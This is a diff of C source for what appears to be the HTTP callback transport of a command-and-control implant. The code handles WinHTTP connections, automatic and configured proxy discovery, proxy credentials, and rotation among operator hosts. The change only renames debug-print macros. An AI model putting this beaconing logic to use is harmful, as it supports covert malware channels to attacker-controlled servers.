@@ -35,7 +35,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     /* if we don't have any more hosts left, then exit */
     if ( ! Instance.Config.Transport.Host )
     {
-        PUTS( "No hosts left to use... exit now." )
+        PUTS_DONT_SEND( "No hosts left to use... exit now." )
         CommandExit( NULL );
     }
 
@@ -46,30 +46,29 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
             // Use preconfigured proxy
             HttpProxy      = Instance.Config.Transport.Proxy.Url;
             
-            /* PRINTF( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpProxy ) */
+            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpProxy ) */
             Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
         } 
         else
         {
             // Autodetect proxy settings
-            /* PRINTF( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent ) */
+            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent ) */
             Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
         }
 
         if ( ! Instance.hHttpSession )
         {
-            PRINTF( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
-
+            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
             Successful = FALSE;
             goto LEAVE;
         }
     }
 
-    /* PRINTF( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance.hHttpSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port ) */
+    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance.hHttpSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port ) */
     hConnect = Instance.Win32.WinHttpConnect( Instance.hHttpSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port, 0 );
     if ( ! hConnect )
     {
-        PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
+        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
         Successful = FALSE;
         goto LEAVE;
     }
@@ -87,12 +86,11 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     if ( Instance.Config.Transport.Secure )
         HttpFlags |= WINHTTP_FLAG_SECURE;
 
-    /* PRINTF( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance.Config.Transport.Method, HttpEndpoint, HttpFlags ) */
+    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance.Config.Transport.Method, HttpEndpoint, HttpFlags ) */
     hRequest = Instance.Win32.WinHttpOpenRequest( hConnect, Instance.Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
     if ( ! hRequest )
     {
-        PRINTF( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
-
+        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
         Successful = FALSE;
         goto LEAVE;
     }
@@ -106,7 +104,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
         if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
-            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
         }
     }
     /* Add our headers */
@@ -130,14 +128,14 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
         if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) )
         {
-            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
         }
 
         if ( Instance.Config.Transport.Proxy.Username )
         {
             if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_USERNAME, Instance.Config.Transport.Proxy.Username, StringLengthW( Instance.Config.Transport.Proxy.Username ) ) )
             {
-                PRINTF( "Failed to set proxy username %u", NtGetLastError() );
+                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
             }
         }
 
@@ -145,7 +143,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
         {
             if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_PASSWORD, Instance.Config.Transport.Proxy.Password, StringLengthW( Instance.Config.Transport.Proxy.Password ) ) )
             {
-                PRINTF( "Failed to set proxy password %u", NtGetLastError() );
+                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
             }
         }
     }
@@ -170,7 +168,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
         if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
         {
             if ( ProxyInfo.lpszProxy ) {
-                PRINTF( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
             }
 
             Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
@@ -189,7 +187,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                     ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                     ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
 
-                    PRINTF( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
+                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
 
                     Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                     Instance.ProxyForUrl       = Instance.Win32.LocalAlloc( LPTR, Instance.SizeOfProxyForUrl );
@@ -206,12 +204,12 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                     AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                     AutoProxyOptions.dwAutoDetectFlags = 0;
 
-                    PRINTF( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
+                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
 
                     if ( Instance.Win32.WinHttpGetProxyForUrl( Instance.hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) )
                     {
                         if ( ProxyInfo.lpszProxy ) {
-                            PRINTF( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                         }
 
                         Instance.SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
@@ -234,7 +232,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     {
         if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, Instance.ProxyForUrl, Instance.SizeOfProxyForUrl ) )
         {
-            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
             goto LEAVE;
         }
     }
@@ -247,8 +245,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
             /* Is the server recognizing us ? are we good ?  */
             if ( HttpQueryStatus( hRequest) != HTTP_STATUS_OK )
             {
-                PUTS( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
-
+                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
                 Successful = FALSE;
                 goto LEAVE;
             }
@@ -287,9 +284,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     {
         if ( NtGetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
             Instance.Session.Connected = FALSE;
-
-        PRINTF( "HTTP Error: %d\n", NtGetLastError() )
-
+        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
         Successful = FALSE;
         goto LEAVE;
     }
@@ -344,7 +339,7 @@ DWORD HttpQueryStatus( HANDLE hRequest )
 
 PHOST_DATA HostAdd( LPWSTR Host, SIZE_T Size, DWORD Port )
 {
-    PRINTF( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );
+    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );
 
     PHOST_DATA HostData = NULL;
 
@@ -381,7 +376,7 @@ PHOST_DATA HostFailure( PHOST_DATA Host )
     /* Increase our failed counter */
     Host->Failures++;
 
-    PRINTF( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )
+    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )
 
     return Host;
 }
@@ -416,8 +411,8 @@ PHOST_DATA HostRandom()
         Host = Host->Next;
     }
 
-    PRINTF( "Index: %d\n", Index )
-    PRINTF( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )
+    PRINTF_DONT_SEND( "Index: %d\n", Index )
+    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )
 
     return Host;
 }
@@ -465,7 +460,7 @@ PHOST_DATA HostRotation( SHORT Strategy )
      * as the operator wants. */
     if ( ( Instance.Config.Transport.HostMaxRetries == 0 ) && ! Host )
     {
-        PUTS( "Specified to keep going. To infinity... and beyond" )
+        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )
 
         /* get linked list */
         Host = Instance.Config.Transport.Hosts;
